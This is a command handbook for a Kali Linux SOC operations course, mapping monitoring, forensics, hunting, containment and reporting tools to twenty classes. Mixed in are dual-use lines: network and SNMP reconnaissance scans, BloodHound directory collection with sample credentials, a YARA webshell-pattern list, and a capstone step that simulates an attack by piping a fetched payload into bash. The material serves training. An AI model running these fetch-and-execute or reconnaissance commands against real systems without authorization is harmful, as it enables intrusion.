# Complete SOC Management & Operations Command Handbook (Kali Linux)
### Class-by-Class Reference Manual (Classes 01 to 20)

This master handbook provides practical, copy-paste ready Kali Linux commands, installation steps, flag breakdowns, and SOC analyst use-cases mapped directly to each session in the **SOC Management & Operations Course** (`class-list.md`).

---

## Table of Contents
1. [Class 01: Introduction to Cyber Security Operations & SOC Architecture Overview](#class-01-introduction-to-cyber-security-operations--soc-architecture-overview)
2. [Class 02: SOC Strategy, Operating Models, Service Catalog & Maturity Model](#class-02-soc-strategy-operating-models-service-catalog--maturity-model)
3. [Class 03: Building and Managing a SOC Team, Shift Management, SLA & KPI](#class-03-building-and-managing-a-soc-team-shift-management-sla--kpi)
4. [Class 04: Cyber Threat Landscape, MITRE ATT&CK, Kill Chain & Threat Intelligence](#class-04-cyber-threat-landscape-mitre-attck-kill-chain--threat-intelligence)
5. [Class 05: Security Monitoring, Event Correlation, Log Management & Detection Strategy](#class-05-security-monitoring-event-correlation-log-management--detection-strategy)
6. [Class 06: SIEM Architecture, Use Cases, Detection Engineering & Alert Tuning](#class-06-siem-architecture-use-cases-detection-engineering--alert-tuning)
7. [Class 07: Incident Detection, Triage, Prioritization & Case Management](#class-07-incident-detection-triage-prioritization--case-management)
8. [Class 08: Incident Response Framework (NIST), Playbooks & Tabletop Exercise](#class-08-incident-response-framework-nist-playbooks--tabletop-exercise)
9. [Class 09: Digital Forensics Overview, Evidence Handling & Malware Investigation](#class-09-digital-forensics-overview-evidence-handling--malware-investigation)
10. [Class 10: Vulnerability Management, Risk Assessment & Patch Management](#class-10-vulnerability-management-risk-assessment--patch-management)
11. [Class 11: Threat Hunting Strategy, IOC Management & Threat Intel Integration](#class-11-threat-hunting-strategy-ioc-management--threat-intel-integration)
12. [Class 12: Security Controls: EDR, XDR, Firewall, WAF, IDS/IPS & SOAR](#class-12-security-controls-edr-xdr-firewall-waf-idsips--soar)
13. [Class 13: SOC Metrics, KPI, KRI, Dashboards & Executive Reporting](#class-13-soc-metrics-kpi-kri-dashboards--executive-reporting)
14. [Class 14: Compliance & Regulatory Frameworks (ISO 27001, NIST CSF, PCI DSS, CIS)](#class-14-compliance--regulatory-frameworks-iso-27001-nist-csf-pci-dss-cis)
15. [Class 15: Business Continuity, Disaster Recovery & Cyber Crisis Management](#class-15-business-continuity-disaster-recovery--cyber-crisis-management)
16. [Class 16: SOC Governance, Policies, SOPs, Playbooks & Runbooks](#class-16-soc-governance-policies-sops-playbooks--runbooks)
17. [Class 17: SOC Automation, SOAR, AI for SOC & Detection Optimization](#class-17-soc-automation-soar-ai-for-soc--detection-optimization)
18. [Class 18: SOC Auditing, Vendor Management & Third-Party Risk Review](#class-18-soc-auditing-vendor-management--third-party-risk-review)
19. [Class 19: Executive Communication, Budget Planning & SOC Roadmap](#class-19-executive-communication-budget-planning--soc-roadmap)
20. [Class 20: End-to-End SOC Capstone Workshop & Incident Leadership Simulation](#class-20-end-to-end-soc-capstone-workshop--incident-leadership-simulation)

---

## Class 01: Introduction to Cyber Security Operations & SOC Architecture Overview

### Practical Focus
Understanding SOC sensor placement, network perimeter monitoring, host network discovery, and interface auditing on Kali Linux.

### 1. Network Interface Inspection & Promiscuous Sniffing Setup
Inspect network cards to configure TAP/SPAN mirroring inputs on Kali sensors.
```bash
# View all network interfaces, IP addresses, and operational link states
ip addr show

# Enable promiscuous mode on an interface (to capture all network traffic on a SPAN/Mirror port)
sudo ip link set eth0 promisc on

# Verify promiscuous mode is enabled ('PROMISC' flag in output)
ip link show eth0

# Check hardware driver, link speed, and duplex status
sudo ethtool eth0
```

### 2. Local Subnet Asset Discovery (ARP & ICMP Sweeps)
Map all active hosts within the SOC monitoring perimeter.
```bash
# Fast ARP scan of local subnet
sudo apt install -y arp-scan
sudo arp-scan --interface=eth0 --localnet

# Passive network discovery (listens for ARP traffic without sending packets)
sudo apt install -y netdiscover
sudo netdiscover -i eth0 -p

# ICMP ping sweep across target subnet
nmap -sn 192.168.1.0/24 -oN /tmp/subnet_discovery.txt
```

### 3. Rapid External Attack Surface Asset Mapping
```bash
# High-speed SYN port scan across subnet (Masscan)
sudo apt install -y masscan
sudo masscan 192.168.1.0/24 -p22,80,443,3389,8080 --rate=1000 -oG /tmp/masscan_assets.txt
```

---

## Class 02: SOC Strategy, Operating Models, Service Catalog & Maturity Model

### Practical Focus
Asset inventorying, identifying open services, assessing target capabilities, and evaluating organizational attack surfaces.

### 1. Full Service Cataloging and OS Fingerprinting
```bash
# Aggressive service detection, default scripts, and OS identification
nmap -sS -sV -O -p- --open -T4 192.168.1.50 -oA /tmp/asset_service_catalog

# Extract listening services and banners for SOC asset inventory
nmap -sV --script banner -p 21,22,23,25,80,110,139,443,445,3389 192.168.1.0/24
```

### 2. Web Service Technology & WAF Identification
```bash
# Detect web server technologies, frameworks, and CMS
sudo apt install -y whatweb wafw00f
whatweb -v https://target.organization.local

# Check if a Web Application Firewall (WAF) is protecting the asset
wafw00f https://target.organization.local
```

### 3. Internal Infrastructure Discovery via SNMP
```bash
# Audit network routers, switches, and servers via SNMP v1/v2c
sudo apt install -y snmp snmp-mibs-downloader
snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.1
```

---

## Class 03: Building and Managing a SOC Team, Shift Management, SLA & KPI

### Practical Focus
SOC analyst workstations, command-line session logging for shift handover, user activity auditing, and multi-pane console setups.

### 1. Analyst Session Recording for Shift Handover & Quality Assurance
```bash
# Record full terminal session with keystrokes and outputs to a text file
script -a -t=2> /tmp/analyst_shift_timing.log /tmp/analyst_shift_session.log

# Perform investigation actions... (type 'exit' when shift ends)
exit

# Replay the analyst session in real-time for training/review
scriptreplay /tmp/analyst_shift_timing.log /tmp/analyst_shift_session.log
```

### 2. Multi-Terminal SOC Monitoring Console (tmux)
```bash
# Start a persistent SOC monitoring session
tmux new -s soc-monitor

# Split panes horizontally (Ctrl+b, then ") and vertically (Ctrl+b, then %)
# Pane 1: Live authentication logs
tail -f /var/log/auth.log

# Pane 2: Live network connections
watch -n 2 'ss -tulpn'

# Pane 3: System resource telemetry
htop
```

### 3. Shift Login & Authentication Auditing
```bash
# Display login history of all analysts on the SOC server
last -a -F | head -n 20

# Check currently active analyst sessions
w
who -a

# Search failed SSH login attempts for SLA/security compliance
sudo journalctl -u ssh -S today | grep -i "failed password"
```

---

## Class 04: Cyber Threat Landscape, MITRE ATT&CK, Kill Chain & Threat Intelligence

### Practical Focus
Deploying MITRE ATT&CK Navigator, STIX/TAXII threat feed queries, and adversary emulation mapped to ATT&CK tactics.

### 1. Install & Run MITRE ATT&CK Navigator on Kali
```bash
# Install Docker prerequisites
sudo apt update && sudo apt install -y docker.io docker-compose
sudo systemctl enable docker --now

# Deploy ATT&CK Navigator container
docker run -d --name attack-navigator -p 4200:4200 bodane/attack-navigator:latest

# Open browser to access GUI: http://localhost:4200
```

### 2. Threat Intel Ingestion via STIX 2 & TAXII Feeds
```bash
# Install Python STIX/TAXII client libraries
pip install stix2 taxii2-client --break-system-packages

# Query Public STIX Enterprise ATT&CK bundle
python3 -c "
import requests, json
url = 'https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json'
data = requests.get(url).json()
techniques = [obj for obj in data['objects'] if obj.get('type') == 'attack-pattern']
print(f'Total Enterprise Techniques Loaded: {len(techniques)}')
for t in techniques[:5]:
    print(f' - {t.get(\"name\")}')
"
```

### 3. MITRE ATT&CK TTP Telemetry Generation
```bash
# T1082: System Information Discovery
uname -a && lsb_release -a && hostname

# T1087.001: Local Account Discovery
cat /etc/passwd | cut -d: -f1,3,7

# T1069.001: Local Group Discovery (Admins)
getent group sudo || getent group wheel

# T1070.004: File Deletion (Defense Evasion)
touch /tmp/malicious_test.sh && rm -f /tmp/malicious_test.sh
```

---

## Class 05: Security Monitoring, Event Correlation, Log Management & Detection Strategy

### Practical Focus
Network Security Monitoring (Suricata, Zeek, tcpdump), host auditing (auditd, osquery), and log shippers.

### 1. Suricata IDS / IPS Network Monitoring
```bash
# Install Suricata
sudo apt install -y suricata jq

# Update ET Open threat detection rules
sudo suricata-update

# Run Suricata live on interface eth0
sudo suricata -c /etc/suricata/suricata.yaml -i eth0 -D

# Monitor alerts in real-time formatted with jq
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert") | {timestamp, src_ip, dest_ip, alert: .alert.signature}'
```

### 2. Zeek (Bro) Network Metadata Analysis
```bash
# Install Zeek
sudo apt install -y zeek

# Run live capture to generate structured logs (conn.log, dns.log, http.log)
sudo zeek -i eth0 local

# Inspect connection logs
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto service orig_bytes resp_bytes | head -n 20
```

### 3. Linux Kernel Auditing (auditd) & Endpoint SQL (osquery)
```bash
# Install and start auditd
sudo apt install -y auditd audispd-plugins osquery
sudo systemctl enable --now auditd

# Set audit watch rule on sensitive files (/etc/shadow, /etc/sudoers)
sudo auditctl -w /etc/shadow -p wa -k shadow_tamper
sudo auditctl -w /etc/sudoers -p wa -k sudoers_tamper

# Search audit logs for key trigger
sudo ausearch -k shadow_tamper --format text

# osquery: Query running processes & listening sockets via SQL
osqueryi "SELECT pid, name, path, cmdline FROM processes WHERE name LIKE '%bash%' OR name LIKE '%nc%';"
osqueryi "SELECT * FROM listening_ports WHERE port IN (22, 80, 443, 445, 3389);"
```

---

## Class 06: SIEM Architecture, Use Cases, Detection Engineering & Alert Tuning

### Practical Focus
Wazuh SIEM engine, Sigma detection rule creation & conversion, Chainsaw EVTX log hunting, and alert tuning.

### 1. Wazuh SIEM Deployment & Control
```bash
# Install Single-Node Wazuh SIEM on Kali
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
sudo bash wazuh-install.sh -a

# Verify service statuses
sudo systemctl status wazuh-manager wazuh-indexer wazuh-dashboard

# Check active registered agents
sudo /var/ossec/bin/agent_control -l
```

### 2. Detection Engineering with Sigma CLI
```bash
# Install Sigma CLI
pip install sigma-cli --break-system-packages

# Clone Sigma rules repository
git clone https://github.com/SigmaHQ/sigma.git /tmp/sigma

# Convert Sigma rule to Elasticsearch Query DSL
sigma convert -t elasticsearch-lucene -p ecs_windows /tmp/sigma/rules/windows/process_creation/proc_creation_win_powershell_download.yml

# Convert Sigma rule to Splunk SPL query
sigma convert -t splunk /tmp/sigma/rules/windows/process_creation/proc_creation_win_powershell_download.yml
```

### 3. Rapid Windows Event Log (EVTX) Hunting with Chainsaw
```bash
# Install Rust/Cargo and build Chainsaw
sudo apt install -y cargo
git clone https://github.com/WithSecureLabs/chainsaw.git /tmp/chainsaw
cd /tmp/chainsaw && cargo build --release

# Hunt for threats in sample EVTX files using Sigma rules
./target/release/chainsaw hunt /path/to/evtx/ -s /tmp/sigma/rules/ --mapping mappings/sigma-event-logs-all.yml
```

### 4. Alert Tuning & False Positive Reduction
```bash
# Wazuh Logtest: Test raw log lines against rules before pushing to production
sudo /var/ossec/bin/wazuh-logtest

# Profile top noisy rule IDs in Wazuh alerts
cat /var/ossec/logs/alerts/alerts.json | jq -r '.rule.id' | sort | uniq -c | sort -rn | head -n 10
```

---

## Class 07: Incident Detection, Triage, Prioritization & Case Management

### Practical Focus
Alert severity classification, automated IOC extraction, and fast evidence sorting.

### 1. CyberChef CLI & Regex-Based IOC Extraction
```bash
# Extract IPv4 addresses from unformatted alert logs
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /var/log/syslog | sort -u

# Extract MD5 / SHA256 hashes from raw incident notes
grep -oE '\b[a-fA-F0-9]{32}\b' /tmp/incident_note.txt   # MD5
grep -oE '\b[a-fA-F0-9]{64}\b' /tmp/incident_note.txt   # SHA256

# Extract URLs from phishing alert bodies
grep -oE '(https?|ftp)://[^\s/$.?#].[^\s]*' /tmp/email_body.eml
```

### 2. VirusTotal CLI & Threat Intel Enrichment
```bash
# Install VirusTotal CLI
sudo apt install -y vt-cli

# Set API Key
vt init --apikey "YOUR_API_KEY"

# Triage suspicious IP address
vt ip 185.220.101.5

# Triage suspicious file hash
vt file a9b14c3e8f6e7d8c5b4a3...
```

### 3. Deploy TheHive & Cortex Case Management (Docker)
```bash
# Fast deployment of TheHive 5 case management container
docker run -d --name thehive -p 9000:9000 thehiveproject/thehive:latest
# Access Web UI: http://localhost:9000
```

---

## Class 08: Incident Response Framework (NIST), Playbooks & Tabletop Exercise

### Practical Focus
NIST SP 800-61r2 execution: Containment, process killing, network socket severing, live memory acquisition, and Volatility 3 analysis.

### 1. Live Containment & Network Isolation
```bash
# Emergency host isolation: Drop all inbound/outbound except SOC management IP
sudo iptables -F
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -A INPUT -s 192.168.1.100 -p tcp --dport 22 -j ACCEPT
sudo iptables -A OUTPUT -d 192.168.1.100 -p tcp --sport 22 -j ACCEPT
```

### 2. Live Process Hunting & Connection Termination
```bash
# Find malicious running processes with process trees
ps auxf

# Inspect open file handles and network sockets of suspicious PID (e.g. PID 1337)
sudo lsof -p 1337

# Kill malicious process immediately
sudo kill -9 1337

# Sever specific active TCP connection to a Command & Control (C2) server
sudo ss -K dst 198.51.100.23 dport = 4444
```

### 3. Volatility 3 Memory Forensics on Kali
```bash
# Install Volatility 3
sudo apt install -y python3-pip
git clone https://github.com/volatilityfoundation/volatility3.git /opt/volatility3
cd /opt/volatility3 && pip install -r requirements.txt --break-system-packages

# Analyze Windows memory image: Process Tree listing
python3 vol.py -f /evidence/memdump.raw windows.pstree

# Search for injected code / hollowed processes
python3 vol.py -f /evidence/memdump.raw windows.malfind

# List active network connections at time of capture
python3 vol.py -f /evidence/memdump.raw windows.netscan
```

---

## Class 09: Digital Forensics Overview, Evidence Handling & Malware Investigation

### Practical Focus
Bit-stream forensic imaging (`dc3dd`), Autopsy, static malware analysis, YARA scanning, and metadata extraction.

### 1. Bit-Stream Forensic Disk Acquisition (Evidence Handling)
```bash
# Install dc3dd / dcfldd forensic imaging tools
sudo apt install -y dc3dd dcfldd

# Create raw DD image with inline SHA256 hashing and log generation
sudo dc3dd if=/dev/sdb of=/evidence/evidence_disk.raw hash=sha256 log=/evidence/imaging_log.txt
```

### 2. Dead-Box Forensics with Sleuth Kit & Autopsy
```bash
# Install The Sleuth Kit and Autopsy
sudo apt install -y sleuthkit autopsy

# List partition table of forensic image
mmls /evidence/evidence_disk.raw

# List deleted files in NTFS/EXT4 partition
fls -r -d -p -o 2048 /evidence/evidence_disk.raw

# Launch Autopsy Web Interface
sudo autopsy
```

### 3. Static Malware Investigation & Reverse Engineering Tools
```bash
# File type header inspection
file /tmp/suspicious_sample.bin

# Extract ASCII & Unicode strings with min length 8
strings -a -n 8 /tmp/suspicious_sample.bin | head -n 30

# Extract hidden embedded payloads/archives
sudo apt install -y binwalk
binwalk -e /tmp/suspicious_sample.bin

# Static scan with YARA rules
sudo apt install -y yara
yara -r /usr/share/yara/rules/malware_rules.yar /tmp/suspicious_sample.bin

# Malicious Office Macro analysis (oletools)
pip install oletools --break-system-packages
olevba /tmp/invoice_phishing.docm
```

---

## Class 10: Vulnerability Management, Risk Assessment & Patch Management

### Practical Focus
Automated vulnerability scanning, CVE verification, web app vulnerability scanning, container security, and system auditing.

### 1. Nuclei Template-Based Vulnerability Scanner
```bash
# Install Nuclei
sudo apt install -y nuclei

# Update vulnerability detection templates
nuclei -update-templates

# Scan target for critical CVEs and misconfigurations
nuclei -u https://target.lab -severity critical,high -o /tmp/nuclei_vuln_report.txt
```

### 2. Web Application Vulnerability Scanning (Nikto)
```bash
# Scan target web server for known CVEs and outdated components
nikto -h http://192.168.1.50 -p 80,443 -C all -Format htm -output /tmp/nikto_report.html
```

### 3. Host Hardening & Security Audit (Lynis)
```bash
# Install Lynis
sudo apt install -y lynis

# Run full system security and vulnerability audit
sudo lynis audit system --quick --report-file /tmp/lynis_report.dat
```

### 4. Container & Software Composition Vulnerability Scanning (Trivy)
```bash
# Install Trivy
sudo apt install -y wget apt-transport-https gnupg
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt update && sudo apt install -y trivy

# Scan local directory/codebase for vulnerable libraries
trivy fs /opt/soc-app/

# Scan Docker image for vulnerabilities
trivy image nginx:latest
```

---

## Class 11: Threat Hunting Strategy, IOC Management & Threat Intel Integration

### Practical Focus
Proactive hunting with YARA, MISP Docker deployment, OTX API queries, and IOC parsing across big log datasets.

### 1. Deploy MISP Threat Intelligence Platform
```bash
# Clone MISP Docker deployment
git clone https://github.com/MISP/misp-docker.git /opt/misp-docker
cd /opt/misp-docker
cp template.env .env
sudo docker-compose up -d

# Web UI: https://localhost (Default user: admin@admin.test / admin)
```

### 2. Proactive YARA Filesystem Threat Hunting
```bash
# Create YARA rule for hunting webshells
cat << 'EOF' > /tmp/hunt_webshell.yar
rule Generic_PHP_Webshell {
    strings:
        $a = "eval(base64_decode(" nocase
        $b = "passthru(" nocase
        $c = "shell_exec(" nocase
        $d = "system($_GET[" nocase
    condition:
        any of them
}
EOF

# Hunt across web directories
yara -r /tmp/hunt_webshell.yar /var/www/html/
```

### 3. AlienVault OTX Threat Intel Ingestion
```bash
# Install OTX Python SDK
pip install OTXv2 --break-system-packages

# Query indicator reputation via Python CLI
python3 -c "
from OTXv2 import OTXv2
otx = OTXv2('YOUR_OTX_API_KEY')
details = otx.get_indicator_details_full('IPv4', '185.220.101.5')
print('Pulse Count:', len(details.get('general', {}).get('pulse_info', {}).get('pulses', [])))
"
```

---

## Class 12: Security Controls: EDR, XDR, Firewall, WAF, IDS/IPS & SOAR

### Practical Focus
Configuring host stateful firewalls (`nftables`/`iptables`), automated IPS blocking with `fail2ban`, and WAF rule inspection.

### 1. Stateful Host Firewall Configuration (`nftables`)
```bash
# Install and enable nftables
sudo apt install -y nftables
sudo systemctl enable --now nftables

# Create a secure baseline ruleset (Drop inbound by default, allow established)
sudo nft add table inet filter
sudo nft add chain inet filter input { type filter hook input priority 0 \; policy drop \; }
sudo nft add chain inet filter forward { type filter hook forward priority 0 \; policy drop \; }
sudo nft add chain inet filter output { type filter hook output priority 0 \; policy accept \; }
sudo nft add rule inet filter input ct state established,related accept
sudo nft add rule inet filter input iif lo accept
sudo nft add rule inet filter input tcp dport 22 accept
```

### 2. Automated Intrusion Prevention with Fail2ban
```bash
# Install fail2ban
sudo apt install -y fail2ban
sudo systemctl enable --now fail2ban

# Check jail status (SSH protection)
sudo fail2ban-client status sshd

# Manually unban or ban an IP address
sudo fail2ban-client set sshd banip 198.51.100.50
sudo fail2ban-client set sshd unbanip 198.51.100.50
```

### 3. Wazuh Active Response (Automated EDR Action)
```bash
# Manually trigger Wazuh Active Response firewall drop script on Kali/Linux agent
sudo /var/ossec/active-response/bin/firewall-drop.sh add - 198.51.100.50 1620000000 01
```

---

## Class 13: SOC Metrics, KPI, KRI, Dashboards & Executive Reporting

### Practical Focus
Calculating Mean Time to Detect (MTTD), Mean Time to Respond (MTTR), log EPS ingestion rates, and generating metric dashboards.

### 1. Calculate SOC Metrics via Python CLI
```bash
# Calculate MTTD & MTTR from alert/incident JSON records
cat << 'EOF' > /tmp/soc_metrics.py
import json
from datetime import datetime

incidents = [
    {"id": "INC-101", "created": "2026-08-01 10:00:00", "detected": "2026-08-01 10:15:00", "resolved": "2026-08-01 11:30:00"},
    {"id": "INC-102", "created": "2026-08-02 14:00:00", "detected": "2026-08-02 14:05:00", "resolved": "2026-08-02 14:45:00"},
]

mttd_list = []
mttr_list = []

for inc in incidents:
    c = datetime.strptime(inc["created"], "%Y-%m-%d %H:%M:%S")
    d = datetime.strptime(inc["detected"], "%Y-%m-%d %H:%M:%S")
    r = datetime.strptime(inc["resolved"], "%Y-%m-%d %H:%M:%S")
    mttd_list.append((d - c).total_seconds() / 60)
    mttr_list.append((r - d).total_seconds() / 60)

print(f"=== SOC KPI Report ===")
print(f"Mean Time To Detect (MTTD): {sum(mttd_list)/len(mttd_list):.2f} Minutes")
print(f"Mean Time To Respond (MTTR): {sum(mttr_list)/len(mttr_list):.2f} Minutes")
EOF

python3 /tmp/soc_metrics.py
```

### 2. Events Per Second (EPS) Ingestion Rate Calculator
```bash
# Calculate average EPS over a 60-second window from syslog
START_LINES=$(wc -l < /var/log/syslog); sleep 10; END_LINES=$(wc -l < /var/log/syslog)
EPS=$(( (END_LINES - START_LINES) / 10 ))
echo "Current Log Ingestion Rate: $EPS Events/sec"
```

---

## Class 14: Compliance & Regulatory Frameworks (ISO 27001, NIST CSF, PCI DSS, CIS)

### Practical Focus
Security Configuration Assessment (SCA), OpenSCAP compliance scanning, and SSL/TLS compliance verification.

### 1. OpenSCAP Automated Compliance Auditing
```bash
# Install OpenSCAP and standard security policies
sudo apt install -y libopenscap8 ssg-debian ssg-debderived

# Run automated CIS benchmark evaluation
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis \
  --results /tmp/cis_scan_results.xml \
  --report /tmp/cis_compliance_report.html \
  /usr/share/xml/scap/ssg/content/ssg-debian12-ds.xml
```

### 2. SSL/TLS Cryptographic Compliance (PCI-DSS / NIST)
```bash
# Clone testssl.sh
git clone --depth 1 https://github.com/drwetter/testssl.sh.git /tmp/testssl
cd /tmp/testssl

# Audit HTTPS service for insecure ciphers (SSLv3, TLS 1.0/1.1)
./testssl.sh --pci --warnings batch https://target.organization.local
```

### 3. Infrastructure as Code (IaC) Compliance (Checkov)
```bash
# Install Checkov
pip install checkov --break-system-packages

# Audit Terraform / Dockerfiles for CIS & NIST compliance
checkov -d /opt/soc-infrastructure/
```

---

## Class 15: Business Continuity, Disaster Recovery & Cyber Crisis Management

### Practical Focus
Immutable backup verification (`restic`), configuration disaster recovery sync, and network failover testing.

### 1. Encrypted & Deduplicated SOC Backups (Restic)
```bash
# Install Restic
sudo apt install -y restic

# Initialize encrypted local/remote repository
restic init --repo /backup/soc_repo

# Create snapshot of SIEM configuration and custom detection rules
restic -r /backup/soc_repo backup /etc/suricata /var/ossec/etc /etc/elasticsearch

# List and verify snapshots
restic -r /backup/soc_repo snapshots
restic -r /backup/soc_repo check
```

### 2. Disaster Recovery Site Synchronization (`rsync`)
```bash
# Synchronize forensic evidence and logs to secondary DR site over SSH
rsync -avzhe ssh --delete --progress /evidence/ soc-dr@192.168.10.50:/remote_dr_backup/evidence/
```

---

## Class 16: SOC Governance, Policies, SOPs, Playbooks & Runbooks

### Practical Focus
Playbook-as-code management with Git, Ansible automated containment runbooks, and Markdown SOP generation.

### 1. Ansible Automated Containment Runbook
```bash
# Install Ansible
sudo apt install -y ansible

# Create containment playbook (Block IP & isolate user)
cat << 'EOF' > /tmp/soc_containment_runbook.yml
---
- name: SOC Emergency Incident Containment Runbook
  hosts: localhost
  tasks:
    - name: Block malicious C2 IP on firewall
      iptables:
        chain: INPUT
        source: "{{ target_c2_ip }}"
        jump: DROP
        comment: SOC Playbook Automated Block
      become: true

    - name: Lock compromised user account
      user:
        name: "{{ compromised_user }}"
        password_lock: yes
      become: true
EOF

# Execute runbook
ansible-playbook /tmp/soc_containment_runbook.yml --extra-vars "target_c2_ip=203.0.113.50 compromised_user=john_doe"
```

### 2. Convert SOP Markdown Playbooks to PDF (Pandoc)
```bash
# Install Pandoc
sudo apt install -y pandoc weasyprint

# Generate clean SOP PDF report from markdown
pandoc /Users/frog/code/github/frog/soc-command/class-4-command.md -o /tmp/SOP_Threat_Intel.pdf --pdf-engine=weasyprint
```

---

## Class 17: SOC Automation, SOAR, AI for SOC & Detection Optimization

### Practical Focus
Deploying Shuffle SOAR, running local LLMs for alert triage (Ollama), and webhook automation.

### 1. Deploy Shuffle SOAR (Open-Source SOAR)
```bash
# Clone and launch Shuffle SOAR
git clone https://github.com/Shuffle/Shuffle.git /opt/shuffle
cd /opt/shuffle && sudo docker-compose up -d
# Access Web UI: http://localhost:3001
```

### 2. Local AI / LLM for SOC Incident Triage (Ollama on Kali)
```bash
# Install Ollama on Kali
curl -fsSL https://ollama.com/install.sh | sh

# Pull lightweight security analysis model
ollama run mistral

# Pipe raw SIEM alert to LLM for automated MITRE mapping and summary
cat << 'EOF' > /tmp/ask_soc_ai.py
import subprocess

alert_log = '{"src_ip": "198.51.100.77", "rule": "Mimikatz commandline detected", "cmd": "sekurlsa::logonpasswords"}'
prompt = f"Analyze this SOC alert, identify the MITRE ATT&CK tactic/technique ID, and suggest 3 containment steps:\n{alert_log}"

proc = subprocess.run(["ollama", "run", "mistral", prompt], capture_output=True, text=True)
print("=== AI Incident Triage Summary ===")
print(proc.stdout)
EOF

python3 /tmp/ask_soc_ai.py
```

---

## Class 18: SOC Auditing, Vendor Management & Third-Party Risk Review

### Practical Focus
Cloud security auditing (Prowler), Active Directory trust auditing (BloodHound), and credential leak auditing.

### 1. Active Directory Trust & Attack Path Auditing (BloodHound)
```bash
# Install BloodHound & Neo4j
sudo apt install -y bloodhound neo4j bloodhound-python

# Ingest Active Directory domain configuration data
bloodhound-python -u 'AuditUser' -p 'Password123' -d corporate.local -ns 192.168.1.10 -c All

# Start Neo4j graph database & BloodHound UI
sudo systemctl start neo4j
bloodhound &
```

### 2. Auditing Third-Party Repositories for Leaked Secrets
```bash
# Install TruffleHog (Secret scanner)
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin

# Audit git repository for exposed API keys and private keys
trufflehog git https://github.com/vendor/integration-app.git
```

---

## Class 19: Executive Communication, Budget Planning & SOC Roadmap

### Practical Focus
Executive chart plotting via Python/matplotlib, SIEM license cost forecasting via EPS stats, and executive summary exports.

### 1. Automated Executive Trend Chart Generator
```bash
# Install Matplotlib
pip install matplotlib --break-system-packages

# Generate Executive Incident Trend Chart
cat << 'EOF' > /tmp/executive_chart.py
import matplotlib.pyplot as plt

months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun"]
incidents = [45, 38, 52, 29, 22, 18]
mttd_mins = [35, 30, 24, 18, 14, 11]

fig, ax1 = plt.subplots(figsize=(8, 4))

color = 'tab:red'
ax1.set_xlabel('Month')
ax1.set_ylabel('Total Incidents', color=color)
ax1.bar(months, incidents, color=color, alpha=0.6)
ax1.tick_params(axis='y', labelcolor=color)

ax2 = ax1.twinx()
color = 'tab:blue'
ax2.set_ylabel('MTTD (Minutes)', color=color)
ax2.plot(months, mttd_mins, color=color, marker='o', linewidth=2)
ax2.tick_params(axis='y', labelcolor=color)

plt.title('SOC Performance & Incident Reduction Trend (Q1-Q2)')
plt.tight_layout()
plt.savefig('/tmp/executive_soc_report.png', dpi=300)
print('Executive chart saved to /tmp/executive_soc_report.png')
EOF

python3 /tmp/executive_chart.py
```

---

## Class 20: End-to-End SOC Capstone Workshop & Incident Leadership Simulation

### Practical Focus
Full end-to-end incident lifecycle: Simulation -> Ingestion -> Triage -> Containment -> Forensic Capture -> Reporting.

```bash
# STEP 1: Simulate Attack Technique (T1059.001 - PowerShell/Bash Command Execution)
bash -c "curl -s http://127.0.0.1:8080/payload.sh | bash"

# STEP 2: Detect in SIEM / Log Ingestion
sudo ausearch -m EXECVE -ts recent | tail -n 15

# STEP 3: Automated Triage & Hash Verification
sha256sum /tmp/payload.sh

# STEP 4: Incident Containment (Block Egress to C2)
sudo iptables -A OUTPUT -d 198.51.100.23 -j DROP

# STEP 5: Dead-Box & Memory Evidence Acquisition
sudo dc3dd if=/tmp/payload.sh of=/evidence/malicious_payload.raw hash=sha256

# STEP 6: Compile Capstone Incident Briefing Document
echo "=== SOC CAPSTONE INCIDENT COMPLETE ==="
echo "Status: Contained | Root Cause: Malicious Script Execution | Containment: Firewall Drop & Process Termination"
```

---
*Manual compiled for Kali Linux SOC Operations & Management Training.*
